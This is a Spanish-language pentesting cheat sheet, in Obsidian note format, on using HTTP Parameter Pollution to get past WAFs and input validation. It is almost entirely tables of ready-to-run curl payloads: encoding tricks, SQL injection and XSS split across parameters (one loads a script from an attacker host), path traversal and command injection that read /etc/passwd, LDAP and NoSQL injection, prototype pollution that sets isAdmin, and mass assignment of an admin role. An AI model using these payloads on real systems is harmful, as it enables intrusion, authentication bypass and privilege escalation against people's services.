---
aliases:
  - HPP Bypass
  - Filter Evasion HPP
  - Multi-Source HPP
tags:
  - type/technique
  - vuln/hpp
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[HTTP Parameter Pollution]]'
---
# HPP - Bypass de Validación

***

## Encoding Tricks (URL-encoded duplicates)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/?a=safe&%61=evil"` (`%61`=`a`) | Frontend WAF check string `a`, backend decodifica → match `a` | Decode-after-WAF differential. |
| `curl "https://target/?a=safe&%2561=evil"` (doble encoded) | Multi-decode chain | Frontend single-decode. |
| `curl "https://target/?a=safe&A=evil"` | Case-sensitive WAF bypass | Backend case-insensitive. |
| `curl "https://target/?a=safe&ａ=evil"` (full-width Unicode) | Parser normaliza Unicode | Lookalike normalization. |
| `curl "https://target/?%41=safe&%61=evil"` (encoded A vs a) | Mixed hex case | Edge filter. |
| `curl "https://target/?a=safe&%0061=evil"` (UTF-8 overlong) | Overlong UTF-8 | Edge parser. |
| `curl --data-urlencode "a=safe" --data-urlencode "%61=evil" https://target/` | Body HPP encoded | POST same idea. |
| `for enc in 'a' '%61' '%2561' 'A' 'ａ' '%41'; do curl "https://target/?a=safe&$enc=evil"; done` | Bulk encoding probe | Discovery. |
^hpp-bypass-encoding

___

## Splitting Param Values

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/search?q=SELECT&q=*&q=FROM&q=users"` | ASP.NET concat → SQL fragmented "SELECT,*,FROM,users" | Standard ASP.NET. |
| `curl "https://target/?q=<scr&q=ipt>alert(1)</scr&q=ipt>"` | XSS payload fragmented | WAF bypass via splits. |
| `curl "https://target/file?f=..&f=/&f=etc&f=passwd"` | Path traversal fragmented | Stack-specific concat. |
| `curl "https://target/cmd?c=ls&c=;&c=cat&c=/etc/passwd"` | Command injection fragmented | Same idea. |
| `curl "https://target/search?q=SELECT&q=/*&q=*/&q=FROM&q=users"` | SQL con SQL comment fragments | Comment injection combo. |
| `curl "https://target/q=<scr&q=ipt%20src=//attacker/x.js>&q=</scr&q=ipt>"` | XSS con encoded fragments | Multi-layer evasion. |
| `curl --data-urlencode "ldap_filter=*)(&" --data-urlencode "ldap_filter=|(uid=*))" https://target/` | LDAP filter fragmented | LDAP injection adjacent. |
^hpp-bypass-split

___

## Array Notation (`a[]=1&a[]=2`)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/?a[]=safe&a[]=evil"` | PHP `$_GET['a']` returns `['safe','evil']` | PHP array notation. |
| `curl "https://target/?a=safe&a[]=evil"` | Mixed scalar/array — type confusion | Edge type juggling. |
| `curl "https://target/?a[0]=safe&a[1]=evil"` | Indexed array | Explicit. |
| `curl "https://target/?a[key1]=safe&a[key2]=evil"` | Associative array | PHP/Rails. |
| `curl "https://target/?a[b][c]=safe&a[b][c]=evil"` | Nested array | Hash nested. |
| `curl "https://target/?__proto__[isAdmin]=true&__proto__[role]=admin"` | Prototype Pollution via array notation | Stack JS + qs. |
| `curl "https://target/?username[%24ne]=null&password[%24ne]=null"` | NoSQL operator inject via array | NoSQLi MongoDB. |
| `curl -X POST -d "roles[]=user&roles[]=admin" https://target/users/1` | Mass assignment via array | Multi-value persist. |
| `curl "https://target/?a=1,2,3"` (comma-delimited) | Per-app split por comma | Custom delimiter. |
^hpp-bypass-array

___

## Mixed Input Sources (Query + Body + Cookie)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d "a=BODY" "https://target/?a=QUERY"` | Query + body conflict — per-stack precedence | Multi-source confusion. |
| `curl -b "a=COOKIE" "https://target/?a=QUERY"` | Cookie + query conflict | Multi-source. |
| `curl -X POST -H "Content-Type: application/json" -d '{"a":"JSON"}' "https://target/?a=QUERY"` | JSON body + query | Modern API confusion. |
| `curl -X POST -F "a=FORM" "https://target/?a=QUERY"` (multipart) | Multipart + query | Multi-parser. |
| `curl -X POST -d "_method=PUT&a=BODY" "https://target/?a=QUERY"` | Method override + HPP | Compound. |
| `curl -X POST -d "a=BODY" -b "a=COOKIE" -H "X-A: HEADER" "https://target/?a=QUERY"` | All sources at once | Multi-source enumeration. |
| Browser DevTools → Network → ver request final → comparar con server response | Identify which source persisted | Live debug. |
^hpp-bypass-multi-source

### Workflow probe multi-source

```bash
TARGET="https://target/endpoint"

# Query only
curl -s "$TARGET?a=QUERY_VAL"

# Body only
curl -s -X POST -d "a=BODY_VAL" "$TARGET"

# Both
curl -s -X POST -d "a=BODY_VAL" "$TARGET?a=QUERY_VAL"

# Cookie + query
curl -s -b "a=COOKIE_VAL" "$TARGET?a=QUERY_VAL"

# JSON + query
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"a":"JSON_VAL"}' "$TARGET?a=QUERY_VAL"

# Compare responses → identify precedence per-stack
```

***
